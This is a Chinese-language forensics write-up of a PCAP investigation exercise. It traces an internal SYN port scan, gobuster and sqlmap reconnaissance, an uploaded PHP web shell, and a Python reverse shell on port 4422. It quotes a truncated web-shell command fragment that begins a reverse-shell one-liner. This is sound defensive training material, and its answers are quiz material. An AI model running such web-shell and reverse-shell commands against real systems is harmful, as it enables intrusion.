## **1、题目简介**

### **1.1 背景介绍**

SOC在其 SIEM 中收到“本地到本地端口扫描”警报，其中内部私有 IP 开始扫描另一个内部系统。您能否调查并确定此活动是否是恶意的？您已经获得了 PCAP，可以使用您希望使用的任何工具进行调查。

## **2、题目解析**

### **2.1 负责进行端口扫描活动的 IP 是什么？**

开始网络分析了解哪些主机在数据包捕获中进行通信，打开wireshark选择【统计】--【会话】，查看TCP会话状态。

![](../Images/435a2aee5569d1ad455e597c466c5493.png)

我们正在寻找端口扫描活动，这意味着一个 IP 地址扫描另一个 IP 地址上的所有端口，在TCP会话中选择对目标端口Port B进行排序，发现源IP地址10.251.96.4进行扫描。

![](../Images/dafc0b6daba9c997c641253f5fbeb8c4.png)

![](../Images/3775bb516a545bebfa2ab38414ee349e.png)

### **2.2 可疑主机扫描的端口范围是多少？**

针对目的端口进行排序，发现端口范围为**1-1024**

![](../Images/54d0a934700c736205a7437d89026219.png)

![](../Images/efc8a6fac0327099f8e57157e176b4d8.png)

![](../Images/0a91aba28f3c034ed89147b8c4a40def.png)

### **2.3 进行的端口扫描类****型是什么？**

针对攻击源IP10.251.96.4进行过滤，过滤方法：**ip.src == 10.251.96.4**，看到大量SYN数据包发送到每个端口10.251.96.5。这告诉我们进行了TCP SYN扫描。

![](../Images/51c9f4b2298c64ac98a6679100c6229c.png)

![](../Images/cea5c134175ab5049ff382a267d6e382.png)

### **2.4 另外两个工具用于对开放端口进行侦察，它们是什么？**

#### **1.第一个工具**

要获得第一个侦察工具，我们可以查看User-Agent,通过过滤器ip.dst == 10.251.96.5 && http.user\_agent查看过滤内容，通过GET请求查看User-Agent为gobuster 3.0.1

![](../Images/35be5e0fb21cc73da577e322bddae329.png)

#### **2.第二个工具**

    继续基于User-Agent判断，并通过过滤器`ip.dst == 10.251.96.5 && http.user_agent && http.request.method == POST`，查看比较长的一段内容，看到User-Agent为`sqlmap 1.4.7`

![](../Images/1a788d800ef605c9fcd7d2b563527721.png)

![](../Images/ea3e96825239f9538c3b23a73d46999f.png)

### **2.5 攻击者通过其上传 Web shell 的 php 文件的名称是什么？**

当有人向网页发送信息时通过HTTP POST请求，过滤`http.request.method==POST`查找相关信息。通过upload.php页面上传2个文件，一个是PNG图片，一个是PHP文件。

![](../Images/b9b8bf7f700461f694fb4f3ed0643c53.png)

       查看Referer字段中内容，发现有`http://10.251.96.5/editprofile.php`信息

![](../Images/6ac36c403ec8ca991e526745ecc5065e.png)

![](../Images/9f91970cd68edcd1c9e3f1dac0d4edb5.png)

### **2.6 攻击者上传的 web shell 的名称是什么？**

基于该POST上传，追踪HTTP流，分析原始HTTP请求信息

![](../Images/a98fcd529f510dcfe90865d0a6198581.png)

发现上传文件名称为：`dbfunctions.php`

![](../Images/4ad57354a1a5ef52bf437b449f2e6630.png)

### **2.7 Web shell 中用于执行命令的参数是什么？**

查看上传文件的内容信息中为PHP代码，执行的命令参数为`cmd`

![](../Images/4dfcc7c2f2e4c5b22f97e479e4088871.png)

![](../Images/dfbfb9c96a71af3c6c7ec7e76acef9b4.png)

### **2.8 攻击者执行的第一个命令是什么？**

根据获取到的webshell内容信息，基于GET请求作为过滤条件进行查询，过滤条件`ip.dst == 10.251.96.5 && http.request.method == GET`，查看请求执行内容为`cmd=id`

![](../Images/8677c069fabf7a0ed9fbeaafb356e706.png)

![](../Images/dac9e89dbea8d37f31ef3e59c84e1c78.png)

### **2.9 攻击者通过命令执行获得的shell连接类型是什么？**

     在流量中还看到了一个通过 GET 方法发送的 python 代码

![](../Images/2ba2a587cd14b446fe2ab2e3604e45a4.png)

查看详情信息，并通过URL解码发现脚本使用"socket"模块，该脚本连接到服务器并提供"/bin/sh"外壳。这种连接到远程服务器的方法用于启动反向 shell

![](../Images/cd247560b87df46a6a2a18aa8cfcabbd.png)

```


/uploads/dbfunctions.php?cmd=python -c 'import socket,subprocess,os;
```

![](../Images/d68fa971a5bb6bd4a9c325810d2f8917.png)

### **2.10 他用于 shell 连接的端口是什么？**

基于解码后的内容查看，反弹shell连接的端口为`4422`

![](../Images/eb3d1501aa428bc9c28ae0cdbce151a5.png)

![](../Images/61e905975d9f65d8d0951d65bfe1dff8.png)
